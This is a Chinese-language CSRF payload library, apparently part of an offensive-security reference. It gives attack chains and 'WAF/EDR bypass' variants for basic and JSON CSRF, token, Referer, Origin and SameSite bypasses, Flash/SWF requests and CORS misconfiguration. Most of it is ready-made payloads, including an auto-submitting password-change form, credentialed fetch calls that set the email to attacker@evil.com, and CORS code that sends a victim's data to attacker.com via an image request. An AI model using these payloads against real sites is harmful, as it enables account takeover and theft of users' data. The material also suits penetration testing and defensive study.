# CSRF 跨站请求伪造 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:基础 CSRF / JSON CSRF / CSRF 绕过 / SameSite 绕过 / Token 绕过 / Referer 绕过 / Flash CSRF / CORS 配置错误利用。

---


### CSRF基础攻击  `csrf-basic`
跨站请求伪造基础攻击技术
子类：**基础攻击** · tags: `csrf` `cross-site` `request` `forgery`

**前置条件：** 目标存在敏感操作；缺少CSRF保护

**攻击链：**

**1. 1. 构造CSRF表单**
_构造自动提交的CSRF表单_
```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

**2. 2. GET请求CSRF**
_GET请求的CSRF攻击_
```
<img src="http://target.com/delete?id=123" style="display:none">
或直接诱导用户点击:
http://target.com/delete?id=123
```

**3. 3. JSON CSRF**
_JSON格式的CSRF攻击_
```
<script>
fetch("http://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**4. 4. 链接诱导**
_诱导用户点击_
```
<a href="http://target.com/action?param=value">点击领取红包</a>
或短链接隐藏真实URL
```

**WAF/EDR 绕过变体：**

**1. Referer绕过**
_绕过Referer检查_
```
使用Referrer Policy:
<meta name="referrer" content="no-referrer">
或使用data URL:
<data:text/html;base64,CSRF_PAYLOAD>
或使用HTTPS->HTTP降级
```

**2. Token绕过**
_绕过Token验证_
```
1. 检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞
```

---

### JSON CSRF攻击  `csrf-json`
针对JSON请求的CSRF攻击技术
子类：**JSON CSRF** · tags: `csrf` `json` `api` `post`

**前置条件：** 目标使用JSON格式请求；缺少CSRF保护；CORS配置不当

**攻击链：**

**1. 1. 简单JSON CSRF**
_使用text/plain绕过预检_
```
<script>
fetch("http://target.com/api/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

**2. 2. Flash JSON CSRF**
_使用Flash发送JSON_
```
# 使用Flash发送JSON请求
# 需要目标允许Content-Type: application/json
# 配合Flash的跨域能力
```

**3. 3. XSSI攻击**
_跨站脚本包含攻击_
```
# 利用JSONP回调
<script src="http://target.com/api/data?callback=attacker"></script>
function attacker(data) { console.log(data); }

# 利用数组返回
[{"secret": "data"}]
<script>var data = [{"secret": "data"}];</script>
```

**4. 4. SWF文件攻击**
_使用SWF文件_
```
# 创建恶意SWF文件发送JSON请求
# 编译ActionScript代码
# 嵌入HTML页面
```

**WAF/EDR 绕过变体：**

**1. 修改Content-Type**
_修改Content-Type绕过_
```
# 尝试不同的Content-Type
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
```

**2. 使用FormData**
_使用FormData发送_
```
let formData = new FormData();
formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
fetch(url, {method: "POST", body: formData, credentials: "include"});
```

---

### CSRF绕过技术  `csrf-bypass`
绕过CSRF防护的各种技术
子类：**绕过技术** · tags: `csrf` `bypass` `token` `referer`

**前置条件：** 目标存在CSRF防护；防护机制存在缺陷

**攻击链：**

**1. 1. Token验证绕过**
_绕过Token验证_
```
# Token可预测
分析Token生成规律，预测有效Token

# Token未绑定会话
使用其他用户的Token

# Token重用
同一个Token可多次使用

# Token在GET参数中泄露
从页面源码获取Token
```

**2. 2. Referer验证绕过**
_绕过Referer验证_
```
# 正则匹配不严谨
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# 空Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP不发送Referer
```

**3. 3. Origin验证绕过**
_绕过Origin验证_
```
# Origin为null
使用data URL或about:blank

# 正则绕过
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11不发送Origin
IE11在某些情况下不发送Origin头
```

**4. 4. SameSite绕过**
_绕过SameSite限制_
```
# SameSite=Lax
GET请求会发送Cookie
构造GET形式的敏感操作

# SameSite未设置
默认行为可能允许跨站发送

# 两分钟窗口
SameSite=Lax有2分钟窗口期
```

**WAF/EDR 绕过变体：**

**1. CORS配置错误**
_利用CORS配置错误_
```
# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
允许任意源

# 反射Origin
Access-Control-Allow-Origin: [任意Origin]
```

---

### SameSite绕过技术  `csrf-samesite`
绕过SameSite Cookie属性的CSRF攻击
子类：**SameSite绕过** · tags: `csrf` `samesite` `cookie` `bypass`

**前置条件：** Cookie设置了SameSite属性；SameSite配置存在缺陷

**攻击链：**

**1. 1. SameSite=Lax绕过**
_绕过SameSite=Lax_
```
# GET请求绕过
构造GET形式的敏感操作
<img src="http://target.com/delete?id=123">

# 顶级导航
<a href="http://target.com/action">点击</a>
window.location = "http://target.com/action"

# 两分钟窗口
在用户交互后2分钟内发起请求
```

**2. 2. SameSite=Strict绕过**
_绕过SameSite=Strict_
```
# 子域名攻击
从子域名发起请求
http://sub.target.com/attack

# Cookie覆盖
设置同名Cookie覆盖
Set-Cookie: session=attacker; Domain=.target.com

# 利用重定向
从目标站点重定向到攻击页面
```

**3. 3. 未设置SameSite**
_利用未设置SameSite_
```
# 旧浏览器默认行为
Chrome < 80 默认None
Safari 默认None

# 可直接发起CSRF攻击
无需特殊绕过
```

**4. 4. 利用OAuth流程**
_利用OAuth流程_
```
# OAuth回调绕过SameSite
1. 发起OAuth登录
2. 在回调中注入恶意请求
3. Cookie在OAuth流程中发送
```

**WAF/EDR 绕过变体：**

**1. 混合内容**
_利用混合内容_
```
# HTTPS->HTTP降级
从HTTPS站点发起HTTP请求
某些情况下不发送SameSite
```

**2. 客户端重定向**
_客户端重定向_
```
# JavaScript重定向
location.href = "http://target.com/action"
可能绕过某些SameSite检查
```

---

### Token绕过技术  `csrf-token-bypass`
绕过CSRF Token验证的技术
子类：**Token绕过** · tags: `csrf` `token` `bypass` `predictable`

**前置条件：** 目标使用CSRF Token；Token机制存在缺陷

**攻击链：**

**1. 1. Token可预测**
_预测Token值_
```
# 分析Token生成规律
# 常见弱Token模式:
- 时间戳
- 递增数字
- 用户ID哈希
- 弱随机数

# 预测并构造有效Token
```

**2. 2. Token未绑定会话**
_利用未绑定Token_
```
# Token不验证会话
# 攻击步骤:
1. 攻击者获取自己的Token
2. 使用该Token构造CSRF
3. 诱使受害者提交

# Token可跨用户使用
```

**3. 3. Token泄露**
_利用Token泄露_
```
# Token在URL中泄露
http://target.com/page?token=xxx

# Token在Referer中泄露
从包含Token的页面跳转

# Token在日志中泄露
服务器日志记录Token
```

**4. 4. Token重放**
_Token重放攻击_
```
# Token可重复使用
# 攻击步骤:
1. 获取有效Token
2. 多次使用同一Token
3. Token不过期或不失效
```

**5. 5. Token删除绕过**
_删除Token绕过_
```
# 尝试删除Token参数
POST /action HTTP/1.1
# 不发送Token参数

# 尝试空Token
POST /action?token=

# 尝试删除Token头
```

**WAF/EDR 绕过变体：**

**1. 方法覆盖**
_方法覆盖绕过_
```
# 使用_method参数
POST /action?_method=PUT&token=xxx

# 使用X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
```

**2. JSON格式**
_JSON格式绕过_
```
# 使用JSON格式提交
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# 可能绕过Token验证
```

---

### Referer绕过技术  `csrf-referer-bypass`
绕过Referer验证的CSRF攻击
子类：**Referer绕过** · tags: `csrf` `referer` `bypass` `header`

**前置条件：** 目标验证Referer头；验证逻辑存在缺陷

**攻击链：**

**1. 1. 正则匹配绕过**
_利用正则匹配缺陷_
```
# 正则只检查包含
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# 正则只检查开头
Referer: http://target.com.attacker.com/

# 正则只检查结尾
Referer: http://attacker.com/target.com
```

**2. 2. 空Referer绕过**
_发送空Referer_
```
# 不发送Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP
```

**3. 3. 子域名绕过**
_利用子域名_
```
# 从子域名发起
Referer: http://sub.target.com/attack

# 从兄弟域名发起
Referer: http://sibling.target.com/

# 利用子域名XSS
在子域名注入XSS发起CSRF
```

**4. 4. Referrer-Policy利用**
_利用Referrer-Policy_
```
# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">
```

**WAF/EDR 绕过变体：**

**1. iframe嵌入**
_iframe绕过_
```
# 使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">
```

**2. Flash/SWF**
_Flash控制Referer_
```
# Flash可以控制Referer
# 编译SWF发送自定义Referer
```

---

### Flash CSRF攻击  `csrf-flash`
利用Flash进行CSRF攻击
子类：**Flash CSRF** · tags: `csrf` `flash` `swf` `crossdomain`

**前置条件：** 目标允许Flash请求；crossdomain.xml配置不当

**攻击链：**

**1. 1. crossdomain.xml利用**
_检查跨域策略文件_
```
# 检查crossdomain.xml
http://target.com/crossdomain.xml

# 允许所有域
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

# 允许特定域
<allow-access-from domain="*.target.com"/>
```

**2. 2. 创建恶意SWF**
_创建恶意Flash文件_
```
// ActionScript代码
package {
  import flash.net.*;
  public class CSRF {
    public function CSRF() {
      var req:URLRequest = new URLRequest("http://target.com/api/action");
      req.method = URLRequestMethod.POST;
      req.data = "param=value";
      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
      sendToURL(req);
    }
  }
}
```

**3. 3. 发送JSON请求**
_发送JSON格式请求_
```
// Flash可以发送任意Content-Type
req.requestHeaders.push(
  new URLRequestHeader("Content-Type", "application/json")
);
req.data = JSON.stringify({email: "attacker@evil.com"});
```

**4. 4. 自定义Header**
_添加自定义Header_
```
// Flash可以添加自定义Header
req.requestHeaders.push(
  new URLRequestHeader("X-Custom-Header", "value")
);

// 绕过某些Header验证
```

**WAF/EDR 绕过变体：**

**1. 绕过预检请求**
_绕过CORS预检_
```
# Flash可以绕过CORS预检
# 直接发送POST请求
# 携带Cookie
```

---

### CORS配置错误利用  `csrf-cors`
利用CORS配置错误进行CSRF攻击
子类：**CORS配置错误** · tags: `csrf` `cors` `misconfiguration` `api`

**前置条件：** CORS配置错误；允许跨域携带凭证

**攻击链：**

**1. 1. 检测CORS配置**
_检测CORS配置_
```
# 发送测试请求
curl -H "Origin: http://attacker.com" http://target.com/api

# 检查响应头
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# 危险配置
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**2. 2. 反射Origin攻击**
_利用反射Origin_
```
# 服务器反射任意Origin
Access-Control-Allow-Origin: [请求的Origin]
Access-Control-Allow-Credentials: true

# 攻击代码
fetch("http://target.com/api/sensitive", {
  credentials: "include"
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```

**3. 3. null源攻击**
_利用null源_
```
# 允许null源
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 使用data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>
```

**4. 4. 正则绕过**
_正则匹配绕过_
```
# 正则匹配不严谨
允许: target.com
绕过: attacktarget.com
target.com.attacker.com

# 攻击代码
fetch("http://target.com.api.attacker.com/api", {
  credentials: "include"
});
```

**WAF/EDR 绕过变体：**

**1. 窃取敏感数据**
_窃取用户数据_
```
# 利用CORS窃取数据
fetch("http://target.com/api/user", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));
});
```

**2. 执行敏感操作**
_执行敏感操作_
```
# 利用CORS执行操作
fetch("http://target.com/api/delete", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`12-clickjacking.md`](12-clickjacking.md)
